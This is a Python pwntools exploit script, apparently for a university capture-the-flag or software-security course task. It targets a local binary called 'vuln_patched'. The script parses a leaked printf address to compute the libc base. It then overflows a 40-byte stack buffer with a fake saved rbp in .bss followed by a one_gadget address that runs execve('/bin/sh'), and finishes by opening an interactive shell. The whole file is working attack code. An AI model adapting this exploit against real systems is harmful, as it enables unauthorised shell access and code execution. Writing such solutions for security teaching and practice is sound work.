#!/usr/bin/env python3

import pwn

pwn.context.terminal = ['gnome-terminal', '--']  # If using GNOME

# pwninit
exe = pwn.ELF("./vuln_patched")
libc = pwn.ELF("./libc.so.6")
ld = pwn.ELF("./ld-linux-x86-64.so.2")

pwn.context.arch = 'amd64'
#pwn.context.binary = exe

port = 1024
#conn = pwn.remote('tasks.ws24.softsec.rub.de', port)
conn = pwn.process([exe.path])

pwn.gdb.attach(conn, gdbscript="""
set detach-on-fork off
set follow-fork-mode child
""")

conn.recvuntil(b'[Samwise Gamgee] This is the localtion of the printf mountains, Mr. Frodo: ')
pointer = conn.recvline()
print(pointer)
pointer = int(pointer[2:-1], 16)
print(pointer)
print(hex(pointer))

libc_base = pointer - libc.symbols['printf']
print(hex(libc_base))

libc.address = libc_base

# problem: we need 40 byte buffer to reach return address, then we can only write 8 byte, so just one gadget
# use: one_gadget ./libc.so.6
"""
0xd509f execve("/bin/sh", rbp-0x40, r13)
constraints:
  address rbp-0x38 is writable
  rdi == NULL || {"/bin/sh", rdi, NULL} is a valid argv
  [r13] == NULL || r13 == NULL || r13 is a valid envp
"""
# as only libc has pie (we just leaked address) 
# and vuln has no pie, we can write in well known bss or data
writeable_address = exe.bss(0x40)
rbp = writeable_address
onegadget = 0xd509f + libc.address

payload = b'A'*(32) + pwn.p64(rbp) + pwn.p64(onegadget)

print(payload)
print(len(payload))

# wait for user input (in this time, connect gdb)
pwn.pause()


conn.sendline(payload)


conn.interactive()
